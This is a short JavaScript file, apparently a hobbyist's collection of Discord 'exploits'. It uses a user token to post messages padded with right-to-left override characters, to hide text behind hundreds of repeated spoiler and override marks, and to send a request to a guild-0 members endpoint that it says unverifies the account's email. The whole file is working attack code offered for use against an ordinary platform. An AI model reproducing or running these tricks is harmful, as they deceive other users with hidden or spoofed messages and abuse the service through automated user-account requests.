/**
 * @author Arun
 * @version 1.0.0
 * @class disscord
 * @classdesc Contains a number of methods =>{mostly bugs}
 * @todo instantiate the class by supplying your token,channel_id,message
*/
class disscord{
    tp = '\u202b'
    constructor(token,channel_id,message){
        this.token=token;
        this.channel_id=channel_id;
        this.message=message;
    }
    //exploit_1(RTL exploit)
    exploit(){
        this.message=`${this.tp} ${this.message} ${this.tp}`
        fetch(`https://discordapp.com/api/v9/channels/${this.channel_id}/messages`,{
            method:"POST",
            headers:{"Authorization": this.token,"Content-Type":"application/json"},
            body:JSON.stringify({content:this.message})
        }).then(res => res.json()).then(data => {
            var msg_id = data["id"]
            try{
                fetch(`https://discordapp.com/api/v9/channels/${this.channel_id}/messages/${msg_id}`,{
                    method:"PATCH",
                    headers:{"Authorization": this.token,"Content-Type":"application/json"},
                    body:JSON.stringify({content:' '+this.message})
                })
            }
            catch(error){
                console.log(error)
            }
        }).catch(error =>{
            console.log(error)
        })
    }
    //exploit_2(unicode/spoiler bug)
    __gen_exploit_msg(h,o){
        let special_char = "||\u202b||"
        this.special_char=special_char.repeat(200)
        return h+this.special_char+o
    }
    hid_msg(hidden_msg,msg){
        this.hidden_msg=hidden_msg
        this.msg=msg
        try{
            fetch(`https://discordapp.com/api/v9/channels/${this.channel_id}/messages`,{
                method:"POST",
                headers:{"Authorization": this.token,"Content-Type":"application/json"},
                body:JSON.stringify({content:this.__gen_exploit_msg(this.hidden_msg,this.msg)})
            })
        }
        catch(err){
            console.log(err)
        }
    }
    //exploit_3(unverify email,thanks to fweak)
    unverify(){
        fetch(`https://discord.com/api/v9/guilds/0/members`,{
            method:"GET",
            headers:{"Authorization": this.token,"Content-Type":"application/json"},
            body:null
        }).then(res => res.json()).then(data => console.log(data)).catch(err =>{console.error(err)})
    }
}


let exp = new disscord("YOUR TOKEN","YOUR CHANNEL ID","Discord bugs")

exp.unverify()


